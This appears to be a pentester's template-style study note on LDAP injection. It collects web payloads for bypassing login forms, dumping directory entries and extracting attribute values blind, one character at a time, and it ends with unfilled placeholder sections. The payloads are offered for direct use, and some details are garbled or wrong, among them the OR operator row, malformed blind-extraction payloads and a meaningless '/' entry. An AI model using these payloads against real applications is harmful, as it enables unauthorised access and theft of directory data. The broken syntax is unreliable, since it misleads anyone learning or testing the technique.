# Description

LDAP Injection is an attack that exploits web applications that construct LDAP (Lightweight Directory Access Protocol) statements from user input. Similar to SQL injection, if the input is not properly sanitized, an attacker can modify the LDAP statement's structure to bypass authentication, alter permissions, or extract sensitive data from the directory.

# Command Syntax

The goal is to break out of the intended filter context and inject your own logic. Always URL-encode special characters when sending them in a request (e.g., `*` becomes `%2a`, `(` becomes `%28`).

**Authentication Bypass (Login Forms):**  
The most common test is on login forms. The typical backend filter is: `(&(USERNAME=INPUT_USER)(PASSWORD=INPUT_P))`

- **Always True Injection:**
    
    - **Username:** `*)(objectClass=*))%00`
        
    - **Password:** `anything`
        
    - **Resulting Filter:** `(&(USERNAME=*)(objectClass=*))%00)(PASSWORD=anything))`. The `%00` (null byte) often terminates the filter, ignoring the rest. The first part `(&(USERNAME=*)(objectClass=*))` is always true if any object exists.
        
- **Always True (Alternative):**
    
    - **Username:** `admin)(!(!(1=0))` or `admin)(|(1=0`
        
    - **Password:** `anything))(&(1=0`
        
    - **Resulting Filter:** `(&(USERNAME=admin)(!(!(1=0)))(PASSWORD=anything))(&(1=0))`. This uses logic to create a always true condition `(!(!(1=0))` and comments out the rest with a false clause `(&(1=0)`.
        
- **Wildcard Login:**
    
    - **Username:** `admin*`
        
    - **Password:** `*` (or any wildcard)
        
    - **Resulting Filter:** `(&(USERNAME=admin*)(PASSWORD=*))`. If the application allows wildcards, this might match the first `admin` account it finds.
        

**Information Disclosure (Search Pages):**  
Test on search fields (e.g., user lookup, product search). The goal is to reveal all entries or cause errors.

- **Return All Entries:**
    
    - **Input:** `*)`
        
    - **Resulting Filter:** `(SEARCHTERM=*))`. This may cause an error or return all objects if the original filter was `(SEARCHTERM=INPUT)`.
        
- **Return All Entries (Complex):**
    
    - **Input:** `*))(&(objectClass=*`
        
    - **Resulting Filter:** `(SEARCHTERM=*))(&(objectClass=*`)`. This closes the first filter and adds a new one that is always true` (objectClass=*)`.
        
- **Get all attributes:**
    
    - **Input:** `*)(cn=*`
        
    - **Resulting Filter:** `(SEARCHTERM=*)(cn=*))`. This might return entries that have any `cn` attribute, potentially revealing more data.
        

**Blind LDAP Injection:**  
When you don't see results but the application behaves differently (e.g., true vs. false responses).

- **Test for Blind:**
    
    - **Input (True):** `)(objectClass=user))`
        
    - **Input (False):** `)(objectClass=invalidClass))`
        
    - If the application's response (page content, timing, error) differs between these two inputs, it is vulnerable to blind injection.
        
- **Extracting data with Booleanization:**
    
    - You can extract data one character at a time by asking true/false questions.
        
    - **Example:** To get the first character of the `cn` attribute for a user:
        
        - `admin)((cn=a*)` -> If true, first char is 'a'.
            
        - `admin)((cn=b*)` -> If true, first char is 'b'. Continue until you find a match.

#### **3. Key Characters to Use in Tests**

| Character  | URL-Encoded | Purpose in LDAP Injection                                                |
| ---------- | ----------- | ------------------------------------------------------------------------ |
| **`*`**    | `%2a`       | Wildcard. Matches any value. Crucial for `always true` conditions.       |
| **`)`**    | `%29`       | Closes a filter. Essential for breaking out of the intended parentheses. |
| **`(`**    | `%28`       | Opens a new filter. Used to inject new conditions.                       |
| `**`       | `%7c`       | Logical OR operator. e.g., `((INJECTION_HERE))`.                         |
| **`&`**    | `%26`       | Logical AND operator. e.g., `(&(INJECTION_HERE))`.                       |
| **`!`**    | `%21`       | Logical NOT operator. e.g., `(!(condition))`.                            |
| **`\`**    | `%5c`       | Escape character. Can be used to bypass simple sanitization.             |
| **`/`**    | `%2f`       | `*`/`...` can be used in blind injection timing attacks.                 |
| **`~`**    | `%7e`       | Approximate match. Less common, but can be useful.                       |
| **`NULL`** | `%00`       | Null Byte. Often used to terminate the filter early, ignoring the rest.  |

# Common Flags / Options

-flag: Description of what this flag does

# Use Cases

When and why you would use this technique?

# Examples

Practical example from a lab machine or HTB.

```sh
example-command -flag target
```

# Related Notes

[[Link to a related atomic note]]

[[Link to a relevant MOC]]

# References

HackTricks

PayloadsAllTheThings